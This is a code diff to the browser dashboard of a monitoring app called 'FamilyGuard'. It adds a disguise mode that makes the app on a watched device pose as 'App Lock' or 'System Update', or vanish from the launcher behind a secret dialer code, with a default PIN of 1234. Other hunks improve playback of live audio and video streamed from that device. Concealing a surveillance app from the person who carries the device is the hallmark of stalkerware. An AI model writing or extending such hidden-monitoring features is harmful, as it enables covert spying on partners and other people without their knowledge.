@@ -216,6 +216,17 @@ function setupEventListeners() {
   
   // Uninstall app from device
   document.getElementById('btnUninstallApp')?.addEventListener('click', uninstallApp);
+  
+  // App Disguise Mode
+  document.getElementById('btnApplyDisguise')?.addEventListener('click', applyDisguiseMode);
+  
+  // Make disguise options clickable
+  document.querySelectorAll('.disguise-option').forEach(option => {
+    option.addEventListener('click', () => {
+      const radio = option.querySelector('input[type="radio"]');
+      radio.checked = true;
+    });
+  });
 }
 
 // API Functions
@@ -1075,6 +1086,58 @@ async function uninstallApp() {
   }
 }
 
+// Apply app disguise mode
+async function applyDisguiseMode() {
+  if (!selectedDevice) {
+    alert('Please select a device first');
+    return;
+  }
+  
+  const selectedMode = document.querySelector('input[name="disguiseMode"]:checked')?.value;
+  if (!selectedMode) {
+    alert('Please select a disguise mode');
+    return;
+  }
+  
+  let confirmMsg = '';
+  switch (selectedMode) {
+    case 'normal':
+      confirmMsg = 'Show app as "FamilyGuard" - the normal parental control interface.';
+      break;
+    case 'applock':
+      confirmMsg = 'Disguise as "App Lock" - shows a fake app lock interface. Tap the app icon 7 times to reveal the real app.';
+      break;
+    case 'system':
+      confirmMsg = 'Disguise as "System Update" - appears as a system service.';
+      break;
+    case 'hidden':
+      confirmMsg = 'COMPLETELY HIDE the app from launcher.\n\nTo access: Dial *#*#12345#*#* or open familyguard://open URL.';
+      break;
+  }
+  
+  if (!confirm(`Apply "${selectedMode}" disguise mode?\n\n${confirmMsg}`)) {
+    return;
+  }
+  
+  try {
+    await sendCommand('set_disguise_mode', { mode: selectedMode });
+    
+    // Show success with reminder
+    let reminder = '';
+    if (selectedMode === 'hidden') {
+      reminder = '\n\n📱 To open the hidden app:\n• Dial: *#*#12345#*#*\n• Or open URL: familyguard://open';
+    } else if (selectedMode === 'applock') {
+      reminder = '\n\n📱 To reveal real app:\n• Tap the App Lock title 7 times quickly\n• Enter admin PIN (default: 1234)';
+    }
+    
+    alert(`✅ Disguise mode "${selectedMode}" applied successfully!${reminder}`);
+    
+  } catch (error) {
+    console.error('Failed to apply disguise mode:', error);
+    alert('Failed to apply disguise mode: ' + error.message);
+  }
+}
+
 async function removeDevice() {
   if (!selectedDevice) return;
   
@@ -1657,24 +1720,50 @@ function displayWebRTCVideo(stream) {
   video.id = 'streamVideoElement';
   video.autoplay = true;
   video.playsInline = true;
-  video.muted = false;
+  video.muted = false; // Important: not muted for audio
+  
+  // Set stream BEFORE adding to DOM
   video.srcObject = stream;
   
+  // Add video to container
   streamVideo.appendChild(video);
   
   // Show appropriate controls based on stream type
   updateStreamControls(streamType);
   
-  // Play video
-  video.play().catch(e => {
-    console.error('[WebRTC] Error playing video:', e);
-    const playBtn = document.createElement('button');
-    playBtn.textContent = '▶ Click to Play';
-    playBtn.className = 'btn btn-primary';
-    playBtn.style.cssText = 'position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);z-index:10;';
-    playBtn.onclick = () => { video.play(); playBtn.remove(); };
-    streamVideo.appendChild(playBtn);
-  });
+  // Log stream info for debugging
+  console.log('[WebRTC] Stream tracks:', stream.getTracks().map(t => ({
+    kind: t.kind,
+    enabled: t.enabled,
+    muted: t.muted,
+    readyState: t.readyState
+  })));
+  
+  // Play video with retry
+  const playVideo = () => {
+    video.play().then(() => {
+      console.log('[WebRTC] Video playing successfully');
+    }).catch(e => {
+      console.error('[WebRTC] Error playing video:', e);
+      // Add click-to-play button for autoplay restrictions
+      const playBtn = document.createElement('button');
+      playBtn.textContent = '▶ Click to Play';
+      playBtn.className = 'btn btn-primary';
+      playBtn.style.cssText = 'position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);z-index:10;';
+      playBtn.onclick = () => { 
+        video.muted = false; // Ensure unmuted
+        video.play().then(() => playBtn.remove()); 
+      };
+      streamVideo.appendChild(playBtn);
+    });
+  };
+  
+  // Wait for loadedmetadata before playing
+  if (video.readyState >= 1) {
+    playVideo();
+  } else {
+    video.onloadedmetadata = playVideo;
+  }
 }
 
 function updateStreamControls(streamType) {
@@ -1743,35 +1832,109 @@ async function togglePictureInPicture() {
 function displayWebRTCAudio(stream) {
   const streamVideo = document.getElementById('streamVideo');
   
+  // Log audio track info for debugging
+  const audioTracks = stream.getAudioTracks();
+  console.log('[WebRTC] Audio tracks:', audioTracks.map(t => ({
+    id: t.id,
+    enabled: t.enabled,
+    muted: t.muted,
+    readyState: t.readyState,
+    settings: t.getSettings ? t.getSettings() : 'N/A'
+  })));
+  
   // Create audio element
   const audio = document.createElement('audio');
+  audio.id = 'streamAudioElement';
   audio.autoplay = true;
+  audio.controls = true; // Show controls for debugging
   audio.srcObject = stream;
-  audio.style.display = 'none';
+  audio.volume = 1.0; // Max volume
+  audio.muted = false; // Ensure not muted
+  
+  // Create audio context for better control and visualization
+  let audioContext = null;
+  let analyser = null;
   
   // Visual indicator
   streamVideo.innerHTML = `
     <div class="audio-indicator active">
       <i class="material-icons">hearing</i>
-      <p>🎧 Live Audio Connected</p>
+      <p>🎧 Live Audio - Connecting...</p>
       <div class="audio-visualizer">
         <span></span><span></span><span></span><span></span><span></span>
+      </div>
+      <div class="audio-controls" style="margin-top: 15px;">
+        <button id="enableAudioBtn" class="btn btn-primary" style="display: none;">🔊 Enable Audio</button>
+        <div class="volume-indicator" style="margin-top: 10px; display: none;">
+          <label>Volume Level: </label>
+          <div id="volumeBar" style="width: 200px; height: 10px; background: #333; display: inline-block; vertical-align: middle; border-radius: 5px;">
+            <div id="volumeLevel" style="width: 0%; height: 100%; background: #4CAF50; border-radius: 5px; transition: width 0.1s;"></div>
+          </div>
+        </div>
       </div>
     </div>
   `;
   
   streamVideo.appendChild(audio);
   
-  // Start playing
-  audio.play().catch(e => {
-    console.error('[WebRTC] Error playing audio:', e);
-    const playBtn = document.createElement('button');
-    playBtn.textContent = 'Click to Enable Audio';
-    playBtn.className = 'btn btn-primary';
-    playBtn.style.marginTop = '20px';
-    playBtn.onclick = () => audio.play();
-    streamVideo.appendChild(playBtn);
-  });
+  // Try to play audio
+  const playAudio = () => {
+    audio.play().then(() => {
+      console.log('[WebRTC] Audio playing successfully');
+      streamVideo.querySelector('.audio-indicator p').textContent = '🎧 Live Audio Connected';
+      document.getElementById('enableAudioBtn').style.display = 'none';
+      
+      // Set up audio analysis to show volume
+      try {
+        audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        const source = audioContext.createMediaStreamSource(stream);
+        analyser = audioContext.createAnalyser();
+        analyser.fftSize = 256;
+        source.connect(analyser);
+        
+        // Don't connect to destination here as audio element handles playback
+        
+        // Show volume indicator
+        const volumeIndicator = streamVideo.querySelector('.volume-indicator');
+        if (volumeIndicator) volumeIndicator.style.display = 'block';
+        
+        // Update volume visualization
+        const dataArray = new Uint8Array(analyser.frequencyBinCount);
+        const updateVolume = () => {
+          if (!analyser) return;
+          analyser.getByteFrequencyData(dataArray);
+          const average = dataArray.reduce((a, b) => a + b, 0) / dataArray.length;
+          const volumeLevel = document.getElementById('volumeLevel');
+          if (volumeLevel) {
+            volumeLevel.style.width = (average / 255 * 100) + '%';
+          }
+          requestAnimationFrame(updateVolume);
+        };
+        updateVolume();
+      } catch (e) {
+        console.log('[WebRTC] Audio visualization not supported:', e);
+      }
+    }).catch(e => {
+      console.error('[WebRTC] Error playing audio (autoplay blocked):', e);
+      streamVideo.querySelector('.audio-indicator p').textContent = '🔇 Click button to enable audio';
+      const enableBtn = document.getElementById('enableAudioBtn');
+      enableBtn.style.display = 'inline-block';
+      enableBtn.onclick = () => {
+        audio.muted = false;
+        audio.play().then(() => {
+          enableBtn.style.display = 'none';
+          streamVideo.querySelector('.audio-indicator p').textContent = '🎧 Live Audio Connected';
+          playAudio(); // Retry audio context setup
+        }).catch(err => {
+          console.error('[WebRTC] Still cannot play audio:', err);
+          alert('Unable to play audio. Please check browser permissions.');
+        });
+      };
+    });
+  };
+  
+  // Play audio
+  playAudio();
 }
 
 function closeWebRTCConnection() {
